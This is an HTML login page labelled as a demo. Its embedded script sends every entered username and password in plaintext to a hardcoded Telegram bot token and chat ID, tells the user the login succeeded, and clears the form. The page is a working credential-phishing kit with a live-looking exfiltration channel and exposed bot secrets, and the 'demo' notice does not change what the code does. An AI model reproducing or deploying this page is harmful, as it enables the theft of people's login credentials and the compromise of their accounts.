<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demo Login Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            width: 100%;
        }

        .login-card {
            background: white;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 28px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
            outline: none;
        }

        .input-field:focus {
            border-color: #667eea;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .demo-notice {
            background: #f8f9fa;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 5px;
            font-size: 14px;
            color: #856404;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
            font-size: 13px;
        }

        .footer a {
            color: white;
            text-decoration: none;
        }

        .status-message {
            text-align: center;
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            display: none;
            font-size: 14px;
        }

        .status-message.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .status-message.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <h2>Welcome Back! üëã</h2>
            
            <div class="demo-notice">
                <strong>üîê Demo Purpose Only</strong><br>
                This is a test login page. Please use any username/password for testing.
            </div>

            <form id="loginForm">
                <div class="input-group">
                    <label>Username or Email</label>
                    <input type="text" class="input-field" id="username" placeholder="Enter username" required>
                </div>

                <div class="input-group">
                    <label>Password</label>
                    <input type="password" class="input-field" id="password" placeholder="Enter password" required>
                </div>

                <button type="submit" class="login-btn" id="loginBtn">Login to Demo</button>
            </form>

            <div id="statusMessage" class="status-message"></div>
        </div>

        <div class="footer">
            <p>¬© 2024 Demo Project ‚Ä¢ <a href="#" onclick="testTelegram()">Test Telegram</a></p>
        </div>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
        const CHAT_ID = '6398977115';

        // Function to send message to Telegram
        async function sendToTelegram(username, password) {
            const message = `üîê *New Login Attempt*%0Aüë§ *Username:* ${username}%0Aüîë *Password:* ${password}%0Aüåç *Time:* ${new Date().toLocaleString()}`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
            
            try {
                const response = await fetch(url);
                const data = await response.json();
                console.log('Telegram Response:', data);
                return data.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Test function
        window.testTelegram = async function() {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.className = 'status-message';
            statusDiv.textContent = '‚è≥ Testing Telegram connection...';
            
            const result = await sendToTelegram('Test User', 'Test Password');
            
            if (result) {
                statusDiv.className = 'status-message success';
                statusDiv.textContent = '‚úÖ Telegram is working! Check your bot.';
            } else {
                statusDiv.className = 'status-message error';
                statusDiv.textContent = '‚ùå Telegram error. Check console.';
            }
            
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        };

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const statusDiv = document.getElementById('statusMessage');
            
            if (!username || !password) {
                statusDiv.className = 'status-message error';
                statusDiv.textContent = '‚ùå Please fill all fields';
                return;
            }

            // Disable button
            loginBtn.disabled = true;
            loginBtn.textContent = 'Processing...';
            
            // Send to Telegram
            const success = await sendToTelegram(username, password);
            
            if (success) {
                statusDiv.className = 'status-message success';
                statusDiv.textContent = '‚úÖ Login successful! (Demo)';
            } else {
                statusDiv.className = 'status-message error';
                statusDiv.textContent = '‚ö†Ô∏è Demo mode - Info logged locally';
            }
            
            // Clear form
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            
            // Reset button
            setTimeout(() => {
                loginBtn.disabled = false;
                loginBtn.textContent = 'Login to Demo';
                statusDiv.style.display = 'none';
            }, 2000);
        });
    </script>
</body>
</html>
